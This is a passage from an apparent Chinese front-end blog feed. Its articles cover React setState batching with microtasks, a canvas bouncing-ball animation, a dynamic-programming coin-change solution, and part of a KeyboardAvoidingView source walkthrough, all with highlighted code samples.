行为已经组件都存放在队列里了，但最重要是寻找到一个时间点去清空队列。这个时间点既不能太快（要后置于当前 JS 的同步任务），又不能太慢（保证让用户无感知）。</p><p>最简单的我们就使用一个定时器来实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">enqueueSetState</span>(<span class="params">stateChange, component</span>) &#123;</span><br><span class="line">  <span class="comment">// 0. 如果setStateQueue的长度是0,也就是在上次flush执行之后第一次往队列里添加</span></span><br><span class="line">  <span class="keyword">if</span> (setStateQueue.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">flush</span>();</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// setStateQueue.push &amp; renderQueue.push ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当更新队列为空时，我们开启定时器，由于定时器是一个异步任务，后面更新 setStateQueue 与 renderQueue 的操作会继续执行。同时需要添加一个判断队列是否为空时候才开启定时器，保证开启定时器的操作只在“一轮更新”的最开始直行，只要是在该轮直行的 enqueueSetState 操作都不会在开启定时器，保证了定时器的唯一性。</p><p>当定时器到达时间阈值时，标志着该轮更新“到点了”，开始清空队列并执行渲染操作，后续再有更新 state 操作的话就会被延迟到“下一轮”更新中。</p><p><img src="https://i.loli.net/2021/05/15/EiIrR9UlcFAby5L.png" alt=""></p><p>当然，使用定时器的方法并不是最优雅的，某些浏览器 <code>setTimeout</code> 的最小触发时间为 4ms，如果我们只想同步任务直行完成之后就直行组件更新，连 4ms 都不想等，或者说总是想要优先于主任务队列中的所有 <code>setTimeout</code> 行为的话，该怎么办呢？</p><p>这时候就要利用到任务轮询中的 <strong>微任务</strong> 了，这也是微任务的应用点之一。我们都知道微任务属于异步任务，会延后于同步任务队列，但是又会优先于宏任务队列，而 <code>Promise.resolve().then()</code> 是一个最典型的微任务，那么我们只需要将 <code>setTimeout</code> 改成微任务就行了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">enqueueSetState</span>(<span class="params">stateChange, component</span>) &#123;</span><br><span class="line">  <span class="comment">// 0. 如果setStateQueue的长度是0,也就是在上次flush执行之后第一次往队列里添加</span></span><br><span class="line">  <span class="keyword">if</span> (setStateQueue.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(flush);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// setStateQueue.push &amp; renderQueue.push ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的话，我们就不会跟其他的 setTimeout 行为发生冲突了，也可以利用这点来让某些行为在组件更新后发生，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Home</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Handle</span></span><br><span class="line">  <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">num</span> + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 利用 setTimeout 将打印行为延后到组件更新完成后直行</span></span><br><span class="line">      <span class="comment">// 此时可以获取到按钮的最新文本内容</span></span><br><span class="line">      <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#btn&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;btn: &quot;</span>, btn.<span class="property">innerHTML</span>);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick.bind(this)&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Click me! (&#123;this.state.num&#125;)</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h1><p>本文主要参考如下视频与文章，以及 React 官网以及具体源码，结合一些个人理解而编写：</p><ul><li><a href="https://www.bilibili.com/video/BV1cE411B7by?from=search&seid=5214127956231478250">React 源码实现</a></li><li><a href="https://juejin.cn/post/6869549410875867144#heading-23">都快2021年了，你竟然还不知道React的JSX和diff算法？</a></li></ul><blockquote><p>配套源码：<a href="https://github.com/EsunR/Study-Book/tree/master/React/React%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90">https://github.com/EsunR/Study-Book/tree/master/React/React%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> 源码解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas实现空间内反复回弹的小球</title>
      <link href="/2020/12/a1ff30679888.html"/>
      <url>/2020/12/a1ff30679888.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1. 题目描述"></a>1. 题目描述</h1><p>再一个空间内存在一个球体按照一定的速度朝一个方向运动，当碰到空间边缘时，会反弹并继续运动。默认该空间中不存在任何摩擦阻力，再小球反弹过程中也不存在动能损耗（即小球一直再空间内做匀速运动）。</p><h1 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2. 题目分析"></a>2. 题目分析</h1><p>之前再完美世界的面试中遇到过这道题，小球的运动很好做，这道题的难点再触碰边界时的运动处理。当时把这道题想复杂了，完全再纠结反弹过程中的出入角计算。</p><p>其实我们都知道，一个物体再某个方向上的运动，可以被拆分为两个方向的运动（如平抛运动，可以拆分为水平方向的运动与垂直方向的运动）。</p><p><img src="https://i.loli.net/2020/12/19/7aqFPbWrC2f6pVw.png" alt=""></p><p>因此，只需要再小球碰壁时，改变其 x 轴或 y 轴的方向，就可以模拟出碰壁效果。</p><h1 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3. 代码实现"></a>3. 代码实现</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;myCanvas&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border: 2px solid pink;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="variable constant_">WIDTH</span> = <span class="number">1000</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="variable constant_">HEIGHT</span> = <span class="number">500</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myCanvas&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    canvas.<span class="property">width</span> = <span class="variable constant_">WIDTH</span>;</span></span><br><span class="line"><span class="language-javascript">    canvas.<span class="property">height</span> = <span class="variable constant_">HEIGHT</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> speed = <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> radius = <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> currentX = <span class="number">210</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> currentY = <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> xDir = <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> yDir = <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">animation</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 清除画布</span></span></span><br><span class="line"><span class="language-javascript">      canvas.<span class="property">width</span> = canvas.<span class="property">width</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 绘制小球</span></span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="title function_">beginPath</span>();</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="title function_">arc</span>(currentX, currentY, radius, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>);</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="title function_">fill</span>();</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="title function_">stroke</span>()</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 计算下一帧小球的位置</span></span></span><br><span class="line"><span class="language-javascript">      currentX += speed * xDir</span></span><br><span class="line"><span class="language-javascript">      currentY += speed * yDir</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 检测是否需要改变 Y 轴上的方向</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (currentY &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        yDir = <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">        currentY = <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (currentY &gt;= <span class="variable constant_">HEIGHT</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        yDir = -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">        currentY = <span class="variable constant_">HEIGHT</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 检测是否需要改变 X 轴上的方向</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (currentX &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        xDir = <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">        currentX = <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (currentX &gt;= <span class="variable constant_">WIDTH</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        xDir = -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">        currentX = <span class="variable constant_">WIDTH</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">requestAnimationFrame</span>(animation)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">animation</span>()</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript算法学习——动态规划</title>
      <link href="/2020/11/65325e90fd69.html"/>
      <url>/2020/11/65325e90fd69.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是动态规划"><a href="#1-什么是动态规划" class="headerlink" title="1. 什么是动态规划"></a>1. 什么是动态规划</h1><p>动态规划（英语：Dynamic programming，简称DP），是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法，动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。动态规划背后的基本思想非常简单，大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。</p><p><img src="https://i.loli.net/2020/11/05/Y5RKWcqZ8LxCUJm.png" alt="动态规划与递归的区别"></p><p>再题目上，动态规划通常有以下特点：</p><ol><li>计数<ul><li>有多少方式走到右下角</li><li>有多少种方法选出 k 个数使得和是sum</li></ul></li><li>求最大值最小值<ul><li>从左上角走到右下角路径的最大数字和</li><li>最长上升子序列长度</li></ul></li><li>求存在性<ul><li>取石子游戏，先手是否必胜</li><li>能不能需拿出 k 个数使得和是 Sum</li></ul></li></ol><h1 id="2-例题"><a href="#2-例题" class="headerlink" title="2. 例题"></a>2. 例题</h1><h2 id="2-1-零钱兑换"><a href="#2-1-零钱兑换" class="headerlink" title="2.1 零钱兑换"></a>2.1 零钱兑换</h2><p><strong>题目：</strong></p><p><a href="https://leetcode-cn.com/problems/coin-change/">leetcode来源</a></p><p>给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 -1。</p><p>你可以认为每种硬币的数量是无限的。</p><p><strong>分析：</strong></p><p>假设我们有硬币 3、5、7，需要凑成 27 元：</p><p><img src="https://i.loli.net/2020/11/05/IL1bSQY5WpAToNi.png" alt=""></p><p><img src="https://i.loli.net/2020/11/05/lb38PpU7xk2NEBT.png" alt=""></p><p><img src="https://i.loli.net/2020/11/05/MIrs7E8SoljOWAN.png" alt=""></p><p><img src="https://i.loli.net/2020/11/05/vDt1qfI4V9EHG3L.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/11/05/BWYNDS.png" alt=""></p><p>将上面的思路转为递归算法，可以写为：</p><p><a href="https://imgchr.com/i/BWNAOK"><img src="https://s1.ax1x.com/2020/11/05/BWNAOK.png" alt="BWNAOK.png"></a></p><p><a href="https://imgchr.com/i/BWNnFH"><img src="https://s1.ax1x.com/2020/11/05/BWNnFH.png" alt="BWNnFH.png"></a></p><p>为了优化算法，我们可以将每一个计算出来的 f(x) 存储起来，依次从 f(0) 求到 f(x)，这样就可以简化重复的计算：</p><p><img src="https://s1.ax1x.com/2020/11/05/BWYI81.png" alt=""></p><p><a href="https://imgchr.com/i/BWYz8I"><img src="https://s1.ax1x.com/2020/11/05/BWYz8I.png" alt="BWYz8I.png"></a></p><p><strong>解答：</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// coins = [3, 5, 7]</span></span><br><span class="line"><span class="comment">// f(x) = 最少用多少枚硬币拼出x</span></span><br><span class="line"><span class="comment">// f(x) = min&#123;f(x-3)+1, f(x-5)+1, f(x-7)+1&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coinChange</span>(<span class="params">coins: <span class="built_in">number</span>[], amount: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">dp</span>: <span class="built_in">number</span>[] = []</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= amount; i++) &#123;</span><br><span class="line">        dp[i] = <span class="title class_">Math</span>.<span class="title function_">min</span>(...coins.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc: <span class="built_in">number</span>[], current</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[i - current] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [...acc, dp[i - current] + <span class="number">1</span>]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> acc</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, []))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dp[amount] === <span class="title class_">Infinity</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[amount]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ReactNative 之 Keyboardavoidingview 源码解析</title>
      <link href="/2020/10/07cb36487291.html"/>
      <url>/2020/10/07cb36487291.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>源码地址：<a href="https://github.com/facebook/react-native/blob/master/Libraries/Components/Keyboard/KeyboardAvoidingView.js">https://github.com/facebook/react-native/blob/master/Libraries/Components/Keyboard/KeyboardAvoidingView.js</a></p></blockquote><h1 id="1-组件原理"><a href="#1-组件原理" class="headerlink" title="1. 组件原理"></a>1. 组件原理</h1><p>Keyboardavoidingview 组件通常用于防止键盘遮挡住界面可视区域。其原理也很简单，Keyboardavoidingview 组件本身是一个容器，当键盘弹出后，Keyboardavoidingview 会自动缩减自身容器的高度，从而达到防止键盘遮挡的目的。</p><p><img src="https://i.loli.net/2020/10/15/2NyJSbsrP73EuDM.png" alt=""></p><h1 id="2-源码解析"><a href="#2-源码解析" class="headerlink" title="2. 源码解析"></a>2. 源码解析</h1><p>该组件在 Render 函数中进行了条件渲染用来处理不同的渲染方式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(): <span class="title class_">React</span>.<span class="property">Node</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;</span><br><span class="line">    behavior,</span><br><span class="line">    children,</span><br><span class="line">    contentContainerStyle,</span><br><span class="line">    enabled,</span><br><span class="line">    keyboardVerticalOffset,</span><br><span class="line">    style,</span><br><span class="line">    ...props</span><br><span class="line">  &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">  <span class="keyword">const</span> bottomHeight = enabled ? <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">bottom</span> : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (behavior) &#123;</span><br><span class="line">    <span class="comment">// height 模式下，键盘展开后改变 Keyboardavoidingview 容器的高度</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;height&#x27;</span>:</span><br><span class="line">      <span class="keyword">let</span> heightStyle;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_frame</span> != <span class="literal">null</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">bottom</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        heightStyle = &#123;</span><br><span class="line">          <span class="attr">height</span>: <span class="variable language_">this</span>.<span class="property">_initialFrameHeight</span> - bottomHeight,</span><br><span class="line">          <span class="attr">flex</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">View</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;this.viewRef&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;StyleSheet.compose(style,</span> <span class="attr">heightStyle</span>)&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onLayout</span>=<span class="string">&#123;this._onLayout&#125;</span> // 记录初始的</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#123;<span class="attr">...props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">      );</span><br><span class="line">    <span class="comment">// position 模式下 Keyboardavoidingview 会被渲染为两层容器</span></span><br><span class="line">    <span class="comment">// 当键盘展开时，外部容器不发生改变，内部容器定位发生变化</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;position&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">View</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;this.viewRef&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;style&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onLayout</span>=<span class="string">&#123;this._onLayout&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#123;<span class="attr">...props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">View</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">style</span>=<span class="string">&#123;StyleSheet.compose(contentContainerStyle,</span> &#123;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">bottom:</span> <span class="attr">bottomHeight</span>,</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            &#125;)&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">      );</span><br><span class="line">    <span class="comment">// padding 模式下，键盘展开后改变 Keyboardavoidingview 容器的下方 padding</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;padding&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">View</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;this.viewRef&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;StyleSheet.compose(style,</span> &#123;<span class="attr">paddingBottom:</span> <span class="attr">bottomHeight</span>&#125;)&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onLayout</span>=<span class="string">&#123;this._onLayout&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          &#123;<span class="attr">...props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span 